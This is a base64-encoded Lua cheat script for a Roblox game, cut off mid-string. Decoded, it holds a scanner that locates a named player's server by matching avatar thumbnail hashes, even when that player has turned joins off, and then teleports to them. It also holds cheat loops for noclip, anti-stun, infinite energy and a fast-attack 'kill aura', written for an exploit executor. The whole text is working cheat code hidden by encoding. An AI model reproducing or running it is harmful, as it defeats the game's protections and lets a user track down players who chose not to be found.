Y2FubmluZyB0aGVuCiAgICAgICAgICAgICAgICBpc1NjYW5uaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgIFNjYW5uZXJCdG4uVGV4dCA9ICJKT0lOIFBMQVlFUiAoSk9JTlMgT0ZGKSIKICAgICAgICAgICAgICAgIFNjYW5uZXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJTY2FubmVyIHN0b3BwZWQuIiwgMikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIHVzZXJuYW1lID0gQ29uZmlnLkpvaW5QbGF5ZXJOYW1lCiAgICAgICAgICAgIGlmIG5vdCB1c2VybmFtZSBvciB1c2VybmFtZSA9PSAiIiB0aGVuCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJQbGVhc2UgZW50ZXIgYSB1c2VybmFtZS4iLCAzKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgcmVxdWVzdEZ1bmMgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0IG9yIChmbHV4dXMgYW5kIGZsdXh1cy5yZXF1ZXN0KSBvciByZXF1ZXN0CiAgICAgICAgICAgIGlmIG5vdCByZXF1ZXN0RnVuYyB0aGVuCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJFeGVjdXRvciBkb2VzIG5vdCBzdXBwb3J0IEhUVFAgcmVxdWVzdHMuIiwgNCkKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlzU2Nhbm5pbmcgPSB0cnVlCiAgICAgICAgICAgIFNjYW5uZXJCdG4uVGV4dCA9ICJTVE9QIFNDQU5OSU5HIgogICAgICAgICAgICBTY2FubmVyQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKICAgICAgICAgICAgCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgLS0gMS4gR2V0IFVzZXIgSUQKICAgICAgICAgICAgICAgIGxvY2FsIHVzZXJJZAogICAgICAgICAgICAgICAgbG9jYWwgdVN1Y2Nlc3MgPSBwY2FsbChmdW5jdGlvbigpIHVzZXJJZCA9IFBsYXllcnM6R2V0VXNlcklkRnJvbU5hbWVBc3luYyh1c2VybmFtZSkgZW5kKQogICAgICAgICAgICAgICAgaWYgbm90IHVTdWNjZXNzIG9yIG5vdCB1c2VySWQgdGhlbgogICAgICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIlVzZXIgbm90IGZvdW5kLiIsIDMpCiAgICAgICAgICAgICAgICAgICAgaXNTY2FubmluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgU2Nhbm5lckJ0bi5UZXh0ID0gIkpPSU4gUExBWUVSIChKT0lOUyBPRkYpIgogICAgICAgICAgICAgICAgICAgIFNjYW5uZXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiRmV0Y2hpbmcgdGFyZ2V0IHRodW1ibmFpbHMuLi4iLCAyKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSAyLiBHZXQgVGFyZ2V0IFRodW1ibmFpbCBIYXNoIChPUFRJTUlaRUQgJiBSRVNJTElFTlQpCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIYXNoID0gIiIKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGdldFRodW1iSGFzaCh1SWQpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdXJscyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgImh0dHBzOi8vdGh1bWJuYWlscy5yb2Jsb3guY29tL3YxL3VzZXJzL2F2YXRhci1oZWFkc2hvdD91c2VySWRzPSIgLi4gdUlkIC4uICImc2l6ZT00OHg0OCZmb3JtYXQ9UG5nJmlzQ2lyY3VsYXI9ZmFsc2UiLAogICAgICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly90aHVtYm5haWxzLnJvYmxveC5jb20vdjEvdXNlcnMvYXZhdGFyLWJ1c3Q/dXNlcklkcz0iIC4uIHVJZCAuLiAiJnNpemU9NDh4NDgmZm9ybWF0PVBuZyZpc0NpcmN1bGFyPWZhbHNlIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdXJsIGluIHBhaXJzKHVybHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIFRyeSAxOiBnYW1lOkh0dHBHZXQgKFN0YW5kYXJkKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzLCBib2R5ID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gZ2FtZTpIdHRwR2V0KHVybCkgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLS0gVHJ5IDI6IHJlcXVlc3Qgd2l0aCBDb29raWUgaWYgSHR0cEdldCBmYWlsZWQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG5vdCBzIG9yIG5vdCBib2R5KSBhbmQgcmVxdWVzdEZ1bmMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgclMsIHJSID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9IHVybCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWV0aG9kID0gIkdFVCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWRlcnMgPSB7fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByUyBhbmQgclIuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbiBib2R5ID0gclIuQm9keSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiBib2R5IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGQgPSBIdHRwU2VydmljZTpKU09ORGVjb2RlKGJvZHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkIGFuZCBkLmRhdGEgYW5kIGQuZGF0YVsxXSBhbmQgZC5kYXRhWzFdLmltYWdlVXJsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBoYXNoID0gZC5kYXRhWzFdLmltYWdlVXJsOm1hdGNoKCJyYnhjZG4lLmNvbS8oWyV3JS1dKykiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhhc2ggdGhlbiByZXR1cm4gaGFzaCBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICB0YXJnZXRIYXNoID0gZ2V0VGh1bWJIYXNoKHVzZXJJZCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbm90IHRhcmdldEhhc2ggdGhlbgogICAgICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIkZhaWxlZCB0byBnZXQgcGxheWVyIHRodW1ibmFpbC4iLCAzKQogICAgICAgICAgICAgICAgICAgIGlzU2Nhbm5pbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIFNjYW5uZXJCdG4uVGV4dCA9ICJKT0lOIFBMQVlFUiAoSk9JTlMgT0ZGKSIKICAgICAgICAgICAgICAgICAgICBTY2FubmVyQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiRGVlcCBzY2FubmluZyBhbGwgU2Vhcy4uLiIsIDMpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGJmU2VhcyA9IHsyNzUzOTE1NTQ5LCA0NDQyMjcyMTgzLCA3NDQ5NDIzNjM1fQogICAgICAgICAgICAgICAgbG9jYWwgcGxhY2VzVG9TY2FuID0ge2dhbWUuUGxhY2VJZH0KICAgICAgICAgICAgICAgIGxvY2FsIGlzQkYgPSBmYWxzZQogICAgICAgICAgICAgICAgZm9yIF8sIGlkIGluIHBhaXJzKGJmU2VhcykgZG8gaWYgZ2FtZS5QbGFjZUlkID09IGlkIHRoZW4gaXNCRiA9IHRydWUgYnJlYWsgZW5kIGVuZAogICAgICAgICAgICAgICAgaWYgaXNCRiB0aGVuIHBsYWNlc1RvU2NhbiA9IGJmU2VhcyBlbmQKCiAgICAgICAgICAgICAgICBmb3IgXywgcGxhY2VJZCBpbiBwYWlycyhwbGFjZXNUb1NjYW4pIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzU2Nhbm5pbmcgb3Igbm90IENvbmZpZy5Jc1J1bm5pbmcgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWFOYW1lID0gKHBsYWNlSWQgPT0gMjc1MzkxNTU0OSBhbmQgIlNlYSAxIikgb3IgKHBsYWNlSWQgPT0gNDQ0MjI3MjE4MyBhbmQgIlNlYSAyIikgb3IgKHBsYWNlSWQgPT0gNzQ0OTQyMzYzNSBhbmQgIlNlYSAzIikgb3IgIkdhbWUiCiAgICAgICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiRGVlcCBTY2FuOiAiIC4uIHNlYU5hbWUgLi4gIi4uLiIsIDIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3Vyc29yID0gIiIKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZXJ2ZXJzQ2hlY2tlZCA9IDAKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB3aGlsZSBpc1NjYW5uaW5nIGFuZCBDb25maWcuSXNSdW5uaW5nIGFuZCBjdXJzb3Igfj0gbmlsIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIFV0aWxpc2F0aW9uIGRlIGdhbWU6SHR0cEdldCBwb3VyIHV0aWxpc2VyIGxhIHNlc3Npb24gYWN0dWVsbGUgKENvb2tpZSkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc1N1Y2Nlc3MsIHNCb2R5ID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLyIgLi4gcGxhY2VJZCAuLiAiL3NlcnZlcnMvUHVibGljP2xpbWl0PTEwMCZjdXJzb3I9IiAuLiAoY3Vyc29yIG9yICIiKSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNTdWNjZXNzIG9yIG5vdCBzQm9keSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gRmFsbGJhY2sgdmVycyByZXF1ZXN0IHNpIEh0dHBHZXQgw6ljaG91ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgclMsIHJSID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9ICJodHRwczovL2dhbWVzLnJvYmxveC5jb20vdjEvZ2FtZXMvIiAuLiBwbGFjZUlkIC4uICIvc2VydmVycy9QdWJsaWM/bGltaXQ9MTAwJmN1cnNvcj0iIC4uIChjdXJzb3Igb3IgIiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNZXRob2QgPSAiR0VUIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhZGVycyA9IHt9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJTIGFuZCByUi5TdGF0dXNDb2RlID09IDIwMCB0aGVuIHNCb2R5ID0gclIuQm9keSBlbHNlIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHNEYXRhID0gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShzQm9keSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNEYXRhIG9yIG5vdCBzRGF0YS5kYXRhIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnNvciA9IHNEYXRhLm5leHRQYWdlQ3Vyc29yCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjdXJyZW50QmF0Y2ggPSB7fQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZXJ2ZXJNYXAgPSB7fQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHNlcnZlciBpbiBwYWlycyhzRGF0YS5kYXRhKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzU2Nhbm5pbmcgb3Igbm90IENvbmZpZy5Jc1J1bm5pbmcgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlcnZlci5wbGF5ZXJUb2tlbnMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB0b2tlbiBpbiBwYWlycyhzZXJ2ZXIucGxheWVyVG9rZW5zKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoY3VycmVudEJhdGNoLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0SWQgPSB0b2tlbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGUgPSAiQXZhdGFySGVhZFNob3QiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW4gPSB0b2tlbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpemUgPSAiNDh4NDgiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWF0ID0gInBuZyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VydmVyTWFwW3Rva2VuXSA9IHNlcnZlci5pZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlcnZlcnNDaGVja2VkID0gc2VydmVyc0NoZWNrZWQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTY2FubmVyQnRuLlRleHQgPSBzZWFOYW1lIC4uICIgfCAiIC4uIHNlcnZlcnNDaGVja2VkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICNjdXJyZW50QmF0Y2ggPj0gOTAgb3IgXyA9PSAjc0RhdGEuZGF0YSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYlN1Y2Nlc3MsIGJSZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlcXVlc3RGdW5jKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9ICJodHRwczovL3RodW1ibmFpbHMucm9ibG94LmNvbS92MS9iYXRjaCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNZXRob2QgPSAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb2R5ID0gSHR0cFNlcnZpY2U6SlNPTkVuY29kZShjdXJyZW50QmF0Y2gpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJTdWNjZXNzIGFuZCBiUmVzcG9uc2UuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBiRGF0YSA9IEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUoYlJlc3BvbnNlLkJvZHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJEYXRhIGFuZCBiRGF0YS5kYXRhIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB0aHVtYiBpbiBwYWlycyhiRGF0YS5kYXRhKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRodW1iSGFzaCA9IHRodW1iLmltYWdlVXJsIGFuZCB0aHVtYi5pbWFnZVVybDptYXRjaCgicmJ4Y2RuJS5jb20vKFsldyUtXSspIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0aHVtYkhhc2ggYW5kIHRodW1iSGFzaCA9PSB0YXJnZXRIYXNoIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZm91bmRKb2JJZCA9IHNlcnZlck1hcFt0aHVtYi5yZXF1ZXN0SWRdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzU2Nhbm5pbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTY2FubmVyQnRuLlRleHQgPSAiSk9JTiBQTEFZRVIgKEpPSU5TIE9GRikiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNjYW5uZXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDcmVhdGVDb25maXJtYXRpb25Qcm9tcHQoIlBsYXllciBGb3VuZCBpbiAiIC4uIHNlYU5hbWUgLi4gIiFcblNlcnZlciBJRDogIiAuLiBmb3VuZEpvYklkLCBmb3VuZEpvYklkLCBwbGFjZUlkLCBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlRlbGVwb3J0U2VydmljZSIpOlRlbGVwb3J0VG9QbGFjZUluc3RhbmNlKHBsYWNlSWQsIGZvdW5kSm9iSWQsIHBsYXllcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kLCBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJKb2luIGNhbmNlbGxlZC4iLCAzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmNsZWFyKGN1cnJlbnRCYXRjaCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5jbGVhcihzZXJ2ZXJNYXApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgaXNTY2FubmluZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiUGxheWVyIG5vdCBmb3VuZC4iLCA1KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlzU2Nhbm5pbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgU2Nhbm5lckJ0bi5UZXh0ID0gIkpPSU4gUExBWUVSIChKT0lOUyBPRkYpIgogICAgICAgICAgICAgICAgU2Nhbm5lckJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIC0tID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgLS0gICAgICAgICAgICAgICAgICAgICAgICAgIExPR0lR" .. "VUUgRFUgQ0hFQVQKICAgIC0tID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKICAgIC0tID09PSBMT09QUyA9PT0KCiAgICAtLSBIRUFSVEJFQVQgTE9PUCAoUEhZU0lDUyBPVkVSUklERSkKICAgIHRhYmxlLmluc2VydChDb25uZWN0aW9ucywgUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbihkZWx0YVRpbWUpCiAgICBlbmQpKQogICAgCiAgICAKICAgIC0tIFNURVBQRUQgTE9PUCAoTk8gQ0xJUCBMT0dJQykKICAgIHRhYmxlLmluc2VydChDb25uZWN0aW9ucywgUnVuU2VydmljZS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGlmIENvbmZpZy5Ob0NsaXAgYW5kIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgYW5kIHBhcnQuQ2FuQ29sbGlkZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBDb25maWcuQW50aVN0dW4gYW5kIGNoYXJhY3RlciBhbmQgaHVtYW5vaWQgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgIGh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBzcGVlZCA9IENvbmZpZy5XYWxrU3BlZWRWYWx1ZQogICAgICAgICAgICBpZiBzcGVlZCA8IDE2IHRoZW4gc3BlZWQgPSAxNiBlbmQgLS0gRm9yY2UgbWluaW11bSBzcGVlZAogICAgICAgICAgICBpZiBodW1hbm9pZC5XYWxrU3BlZWQgPCBzcGVlZCB0aGVuIGh1bWFub2lkLldhbGtTcGVlZCA9IHNwZWVkIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgaHVtYW5vaWQuSnVtcFBvd2VyIDwgQ29uZmlnLkp1bXBQb3dlclZhbHVlIHRoZW4gaHVtYW5vaWQuSnVtcFBvd2VyID0gQ29uZmlnLkp1bXBQb3dlclZhbHVlIGVuZAogICAgICAgICAgICBpZiByb290UGFydC5BbmNob3JlZCB0aGVuIHJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgZW5kIC0tIEZvcmNlIFVuYW5jaG9yCiAgICAgICAgICAgIAogICAgICAgICAgICBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKCJTdHVuIiwgMCkKICAgICAgICAgICAgY2hhcmFjdGVyOlNldEF0dHJpYnV0ZSgiQnVzeSIsIGZhbHNlKQogICAgICAgICAgICBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKCJDYW50TW92ZSIsIGZhbHNlKQogICAgICAgICAgICBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKCJTdHVubmVkIiwgZmFsc2UpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBSZW1vdmUgU3R1biBCb2R5TW92ZXJzCiAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKHJvb3RQYXJ0OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiAodjpJc0EoIkJvZHlWZWxvY2l0eSIpIG9yIHY6SXNBKCJCb2R5R3lybyIpIG9yIHY6SXNBKCJCb2R5UG9zaXRpb24iKSkgYW5kIHYuTmFtZSB+PSAiRmx5VmVsb2NpdHkiIGFuZCB2Lk5hbWUgfj0gIkZseUd5cm8iIGFuZCB2Lk5hbWUgfj0gIkZhcm1WZWxvY2l0eSIgdGhlbgogICAgICAgICAgICAgICAgICAgIHY6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gSW5maW5pdGUgRW5lcmd5IExvZ2ljCiAgICAgICAgaWYgQ29uZmlnLkluZmluaXRlRW5lcmd5IGFuZCBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRW5lcmd5IikgdGhlbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuRW5lcmd5LlZhbHVlID0gY2hhcmFjdGVyLkVuZXJneS5NYXhWYWx1ZQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQpKQoKICAgIC0tID09PSBGQVNUIEFUVEFDSyAvIEtJTEwgQVVSQSBTWVNURU0gPT09CiAgICBsb2NhbCBmdW5jdGlvbiBBdHRhY2tGdW5jdGlvbigpCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIHRvb2wgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRvb2wiKQogICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgLS0gQnlwYXNzIGF0dGFjayBhbmltYXRpb25zCiAgICAgICAgICAgIGlmIENvbmZpZy5Ob0Nvb2xkb3duIGFuZCBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgI